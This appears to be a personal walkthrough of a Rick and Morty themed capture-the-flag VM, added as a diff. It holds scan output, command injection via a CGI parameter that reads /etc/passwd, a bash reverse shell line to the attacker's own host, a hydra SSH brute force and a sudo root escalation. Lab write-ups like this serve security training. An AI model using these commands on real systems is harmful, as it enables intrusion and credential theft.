@@ -1,0 +1,273 @@
+─$ nmap -sSCV -p  21,22,80,9090,13337,2222,60000 192.168.56.141
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 20:23 PDT
+Nmap scan report for 192.168.56.141
+Host is up (0.00043s latency).
+
+PORT      STATE  SERVICE      VERSION
+21/tcp    open   ftp          vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.56.105
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+22/tcp    open   ssh?
+| fingerprint-strings: 
+|   NULL: 
+|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp    open   http         Apache httpd 2.4.27 ((Fedora))
+|_http-title: Morty's Website
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.27 (Fedora)
+2222/tcp  closed EtherNetIP-1
+9090/tcp  open   http         Cockpit web service 161 or earlier
+|_http-title: Did not follow redirect to https://192.168.56.141:9090/
+13337/tcp open   unknown
+| fingerprint-strings: 
+|   NULL: 
+|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
+60000/tcp open   unknown
+|_drda-info: ERROR
+| fingerprint-strings: 
+|   NULL, ibm-db2: 
+|_    Welcome to Ricks half baked reverse shell...
+
+
+└─$ sudo dirsearch -u http://192.168.56.141                                                       
+[sudo] password for ed: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/ed/reports/http_192.168.56.141/_25-04-16_20-24-58.txt
+
+Target: http://192.168.56.141/
+
+[20:24:58] Starting: 
+[20:24:59] 403 -  220B  - /.ht_wsr.txt
+[20:24:59] 403 -  223B  - /.htaccess.bak1
+[20:24:59] 403 -  225B  - /.htaccess.sample
+[20:24:59] 403 -  223B  - /.htaccess.save
+[20:24:59] 403 -  224B  - /.htaccess_extra
+[20:24:59] 403 -  223B  - /.htaccess.orig
+[20:24:59] 403 -  221B  - /.htaccess_sc
+[20:24:59] 403 -  221B  - /.htaccessBAK
+[20:24:59] 403 -  221B  - /.htaccessOLD
+[20:24:59] 403 -  223B  - /.htaccess_orig
+[20:24:59] 403 -  213B  - /.htm
+[20:24:59] 403 -  222B  - /.htaccessOLD2
+[20:24:59] 403 -  219B  - /.htpasswds
+[20:24:59] 403 -  214B  - /.html
+[20:24:59] 403 -  220B  - /.httr-oauth
+[20:24:59] 403 -  223B  - /.htpasswd_test
+[20:25:06] 403 -  217B  - /cgi-bin/
+[20:25:15] 301 -  240B  - /passwords  ->  http://192.168.56.141/passwords/
+[20:25:15] 200 -    1KB - /passwords/
+[20:25:18] 200 -  126B  - /robots.txt
+
+http://192.168.56.141/passwords/FLAG.txt
+    FLAG{Yeah d- just don't do it.} - 10 Points
+
+http://192.168.56.141/robots.txt
+    They're Robots Morty! It's ok to shoot them! They're just Robots!
+
+/cgi-bin/root_shell.cgi
+/cgi-bin/tracertool.cgi
+/cgi-bin/*
+
+└─$ ftp 192.168.56.141
+Connected to 192.168.56.141.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.141:ed): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||37962|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
+drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
+226 Directory send OK.
+ftp> more FLAG.txt
+FLAG{Whoa this is unexpected} - 10 Points
+
+
+//port 9090
+FLAG {There is no Zeus, in your face!} - 10 Points
+
+
+bash -i >& /dev/tcp/192.168.56.105/8821 0>&1
+
+
+└─$ nc 192.168.56.141 60000
+Welcome to Ricks half baked reverse shell...
+# ls
+FLAG.txt 
+# cat FLAG.txt
+FLAG{Flip the pickle Morty!} - 10 Points 
+
+http://192.168.56.141/cgi-bin/tracertool.cgi?ip=8.8.8.8|ls%20-la%20/
+    total 20
+    dr-xr-xr-x.  17 root root  236 Aug 18  2017 .
+    dr-xr-xr-x.  17 root root  236 Aug 18  2017 ..
+    -??????????   ? ?    ?       ?            ? .rnd
+    lrwxrwxrwx.   1 root root    7 Feb 11  2017 bin -> usr/bin
+    dr-xr-xr-x.   5 root root 4096 Aug 18  2017 boot
+    drwxr-xr-x.  19 root root 3580 Apr 17 13:18 dev
+    drwxr-xr-x.  93 root root 8192 Sep 21  2017 etc
+    drwxr-xr-x.   5 root root   52 Aug 18  2017 home
+    lrwxrwxrwx.   1 root root    7 Feb 11  2017 lib -> usr/lib
+    lrwxrwxrwx.   1 root root    9 Feb 11  2017 lib64 -> usr/lib64
+    drwxr-xr-x.   2 root root    6 Feb 11  2017 media
+    drwxr-xr-x.   2 root root    6 Feb 11  2017 mnt
+    drwxr-xr-x.   2 root root    6 Feb 11  2017 opt
+    dr-xr-xr-x. 127 root root    0 Apr 17 13:18 proc
+    dr-xr-x---.   4 root root  191 Aug 25  2017 root
+    drwxr-xr-x.  29 root root  940 Apr 17 14:18 run
+    lrwxrwxrwx.   1 root root    8 Feb 11  2017 sbin -> usr/sbin
+    drwxr-xr-x.   2 root root    6 Feb 11  2017 srv
+    dr-xr-xr-x.  13 root root    0 Apr 17 13:18 sys
+    drwxrwxrwt.   2 root root   40 Apr 17 15:32 tmp
+    drwxr-xr-x.  12 root root  144 Aug 18  2017 usr
+    drwxr-xr-x.  22 root root 4096 Aug 21  2017 var
+
+
+http://192.168.56.141/cgi-bin/tracertool.cgi?ip=8.8.8.8|tail%20/etc/passwd
+
+    rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+    abrt:x:173:173::/etc/abrt:/sbin/nologin
+    cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
+    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+    chrony:x:995:993::/var/lib/chrony:/sbin/nologin
+    tcpdump:x:72:72::/:/sbin/nologin
+    RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+    Morty:x:1001:1001::/home/Morty:/bin/bash
+    Summer:x:1002:1002::/home/Summer:/bin/bash
+    apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+
+http://192.168.56.141/passwords/passwords.html
+
+Password: winter
+
+└─$ ssh Summer@192.168.56.141 -p 22222
+Summer@192.168.56.141's password: 
+Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
+[Summer@localhost ~]$ id
+uid=1002(Summer) gid=1002(Summer) groups=1002(Summer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[Summer@localhost ~]$ cd ~
+[Summer@localhost ~]$ ls -la
+total 20
+drwx------. 2 Summer Summer  99 Sep 15  2017 .
+drwxr-xr-x. 5 root   root    52 Aug 18  2017 ..
+-rw-------. 1 Summer Summer   1 Sep 15  2017 .bash_history
+-rw-r--r--. 1 Summer Summer  18 May 30  2017 .bash_logout
+-rw-r--r--. 1 Summer Summer 193 May 30  2017 .bash_profile
+-rw-r--r--. 1 Summer Summer 231 May 30  2017 .bashrc
+-rw-rw-r--. 1 Summer Summer  48 Aug 22  2017 FLAG.txt
+[Summer@localhost ~]$ more FLAG.txt 
+FLAG{Get off the high road Summer!} - 10 Points
+
+
+[Summer@localhost Morty]$ scp -P 22222 Summer@192.168.56.141:/home/Morty/journal.txt.zip ed@192.168.56.105:/tmp/ 
+Summer@192.168.56.141's password: 
+ed@192.168.56.105's password: 
+journal.txt.zip                                                   100%  414    38.0KB/s   00:00    
+Connection to 192.168.56.141 closed.
+[Summer@localhost Morty]$ scp -P 22222 Summer@192.168.56.141:/home/Morty/Safe_Password.jpg ed@192.168.56.105:/tmp/ 
+Summer@192.168.56.141's password: 
+ed@192.168.56.105's password: 
+Safe_Password.jpg                                                 100%   42KB   2.9MB/s   00:00    
+Connection to 192.168.56.141 closed.
+
+└─$ strings Safe_Password.jpg 
+JFIF
+Exif
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+
+└─$ cat journal.txt
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points 
+
+
+Flag 8: FLAG{And Awwwaaaaayyyy we Go!} 100/130 Points
+
+./safe 131333
+
+Ricks passwd hints:
+    1 uppercase
+    1 digit
+    1 word in old bands name: the Flesh Curtains
+
+
+➜  ~ crunch  7 7 -t ,%Flesh -o rick2.txt
+➜  ~ crunch  10 10 -t ,%Curtains -o rick3.txt
+
+
+└─$ hydra -l RickSanchez -P rick3.txt ssh://192.168.56.141:22222
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-17 00:22:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 260 login tries (l:1/p:260), ~17 tries per task
+[DATA] attacking ssh://192.168.56.141:22222/
+ [22222][ssh] host: 192.168.56.141   login: RickSanchez   password: P7Curtains
+1 of 1 target successfully completed, 1 valid password found
+
+[RickSanchez@localhost ~]$ sudo -l
+[sudo] password for RickSanchez: 
+Matching Defaults entries for RickSanchez on localhost:
+    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User RickSanchez may run the following commands on localhost:
+    (ALL) ALL
+
+[RickSanchez@localhost ~]$ sudo /bin/bash
+[root@localhost RickSanchez]# [RickSanchez@localhost ~]$ sudo -l
+bash: [RickSanchez@localhost: command not found
+[root@localhost RickSanchez]# [sudo] password for RickSanchez: 
+bash: [sudo]: command not found
+[root@localhost RickSanchez]# Matching Defaults entries for RickSanchez on localhost:
+bash: Matching: command not found
+[root@localhost RickSanchez]#     !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+bash: !visiblepw,: event not found
+[root@localhost RickSanchez]#     env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+>     LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+>     LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+[root@localhost RickSanchez]#     secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+[root@localhost RickSanchez]# 
+[root@localhost RickSanchez]# User RickSanchez may run the following commands on localhost:
+bash: User: command not found
+[root@localhost RickSanchez]#     (ALL) ALL
+bash: syntax error near unexpected token `ALL'
+[root@localhost RickSanchez]# 
+[root@localhost RickSanchez]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[root@localhost RickSanchez]# 
+[root@localhost ~]# more FLAG.txt 
+FLAG: {Ionic Defibrillator} - 30 points
